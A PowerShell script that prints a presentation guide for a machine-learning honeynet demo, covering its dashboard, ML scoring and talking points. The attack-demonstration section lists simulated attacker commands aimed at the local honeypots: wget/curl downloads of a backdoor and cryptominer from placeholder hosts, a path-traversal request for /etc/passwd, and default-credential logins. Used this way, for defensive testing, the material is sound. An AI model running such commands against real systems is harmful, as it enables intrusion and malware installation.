# HONEYNET DEMO SCRIPT FOR TOMORROW
# Complete step-by-step demonstration

Write-Host "================================" -ForegroundColor Cyan
Write-Host "🍯 AI-HONEYNET DEMO GUIDE" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "🎯 DEMO FLOW:" -ForegroundColor Yellow
Write-Host ""

Write-Host "PART 1: Show the Dashboard (5 minutes)" -ForegroundColor Green
Write-Host "1. Open browser: http://localhost:5173" -ForegroundColor White
Write-Host "2. Point out these features:" -ForegroundColor White
Write-Host "   - Service Status Grid (5 honeypots: SSH, HTTP, FTP, Telnet, MySQL)" -ForegroundColor Gray
Write-Host "   - Total Events, Active Sessions, Unique Attackers" -ForegroundColor Gray
Write-Host "   - Severity Distribution (HIGH/MEDIUM/LOW)" -ForegroundColor Gray
Write-Host "   - Recent Events with ML Scores" -ForegroundColor Gray
Write-Host "   - Top Attackers with event counts" -ForegroundColor Gray
Write-Host ""

Write-Host "PART 2: Explain the Architecture (3 minutes)" -ForegroundColor Green
Write-Host "Say: 'This is an AI-driven adaptive honeynet with:" -ForegroundColor White
Write-Host "   - 4 honeypot services (SSH, HTTP, FTP, Telnet)" -ForegroundColor Gray
Write-Host "   - Real-time ML analysis using Isolation Forest + Autoencoder" -ForegroundColor Gray
Write-Host "   - Automatic threat classification (HIGH/MEDIUM/LOW)" -ForegroundColor Gray
Write-Host "   - Network-wide attack capture from any device" -ForegroundColor Gray
Write-Host ""

Write-Host "PART 3: Live Attack Demonstration (10 minutes)" -ForegroundColor Green
Write-Host ""

Write-Host "Attack 1: SSH (Cowrie) - High Severity" -ForegroundColor Cyan
Write-Host "From your phone/laptop:" -ForegroundColor White
Write-Host "  ssh -p 2222 root@192.168.1.3" -ForegroundColor Gray
Write-Host "  wget http://malicious-site.com/backdoor.sh" -ForegroundColor Gray
Write-Host "  curl -o miner.sh http://evil.com/cryptominer" -ForegroundColor Gray
Write-Host "Expected: Dashboard shows HIGH severity (ML Score: 0.900)" -ForegroundColor Yellow
Write-Host ""

Write-Host "Attack 2: HTTP - Medium Severity" -ForegroundColor Cyan
Write-Host "From browser or curl:" -ForegroundColor White
Write-Host "  curl http://192.168.1.3:8080/admin.php" -ForegroundColor Gray
Write-Host "  curl http://192.168.1.3:8080/../../../etc/passwd" -ForegroundColor Gray
Write-Host "Expected: Dashboard shows MEDIUM severity (ML Score: 0.5-0.7)" -ForegroundColor Yellow
Write-Host ""

Write-Host "Attack 3: FTP - Login Attempt" -ForegroundColor Cyan
Write-Host "From terminal:" -ForegroundColor White
Write-Host "  ftp 192.168.1.3 2121" -ForegroundColor Gray
Write-Host "  Username: admin" -ForegroundColor Gray
Write-Host "  Password: password123" -ForegroundColor Gray
Write-Host "Expected: Dashboard shows FTP login attempt" -ForegroundColor Yellow
Write-Host ""

Write-Host "Attack 4: Telnet - Legacy Protocol" -ForegroundColor Cyan
Write-Host "From terminal:" -ForegroundColor White
Write-Host "  telnet 192.168.1.3 2323" -ForegroundColor Gray
Write-Host "  Username: root" -ForegroundColor Gray
Write-Host "  Password: toor" -ForegroundColor Gray
Write-Host "Expected: Dashboard shows Telnet login attempt" -ForegroundColor Yellow
Write-Host ""

Write-Host "PART 4: Show ML Analysis (5 minutes)" -ForegroundColor Green
Write-Host "1. Click on an attacker IP in 'Top Attackers'" -ForegroundColor White
Write-Host "2. Show filtered events from that IP" -ForegroundColor White
Write-Host "3. Point out ML scores next to each event" -ForegroundColor White
Write-Host "4. Explain: 'Different commands get different scores based on:" -ForegroundColor White
Write-Host "   - Isolation Forest detects anomalies" -ForegroundColor Gray
Write-Host "   - Autoencoder validates patterns" -ForegroundColor Gray
Write-Host "   - TF-IDF analyzes command text" -ForegroundColor Gray
Write-Host "   - Weighted ensemble combines all three'" -ForegroundColor Gray
Write-Host ""

Write-Host "PART 5: Database Verification (3 minutes)" -ForegroundColor Green
Write-Host "Run in PowerShell:" -ForegroundColor White
Write-Host '  $env:PGPASSWORD="honeynet123"' -ForegroundColor Gray
Write-Host '  psql -h localhost -U honeynet -d honeynet -c "SELECT service, COUNT(*) FROM events GROUP BY service"' -ForegroundColor Gray
Write-Host "Expected: Shows events from multiple services (SSH, HTTP, FTP, Telnet)" -ForegroundColor Yellow
Write-Host ""

Write-Host "TALKING POINTS:" -ForegroundColor Red
Write-Host "✅ 'This is NOT just a single honeypot - it's a full HONEYNET'" -ForegroundColor White
Write-Host "✅ 'ML analysis is REAL-TIME, not pre-calculated from dataset'" -ForegroundColor White
Write-Host "✅ 'Works over NETWORK, not just localhost'" -ForegroundColor White
Write-Host "✅ 'Captures attacks from SSH, HTTP, FTP, Telnet - like a real server'" -ForegroundColor White
Write-Host "✅ 'Isolation Forest + Autoencoder = legitimate ML, not simple rules'" -ForegroundColor White
Write-Host ""

Write-Host "QUESTIONS TO ANTICIPATE:" -ForegroundColor Red
Write-Host "Q: 'Is this just a dataset display?'" -ForegroundColor White
Write-Host "A: 'No! Watch - I'll run a unique command never seen before...'" -ForegroundColor Gray
Write-Host "   (Run: echo 'unique-test-$(date)' and show new ML score)" -ForegroundColor Gray
Write-Host ""
Write-Host "Q: 'Why only these 4 services?'" -ForegroundColor White
Write-Host "A: 'These represent the most common attack vectors. Architecture supports adding more (MySQL, SMB, etc)'" -ForegroundColor Gray
Write-Host ""
Write-Host "Q: 'Can this work on the internet?'" -ForegroundColor White
Write-Host "A: 'Yes! Just need port forwarding on router. Currently showing local network for safety.'" -ForegroundColor Gray
Write-Host ""

Write-Host "================================" -ForegroundColor Cyan
Write-Host "⏱️  Total Demo Time: ~25 minutes" -ForegroundColor Yellow
Write-Host "================================" -ForegroundColor Cyan
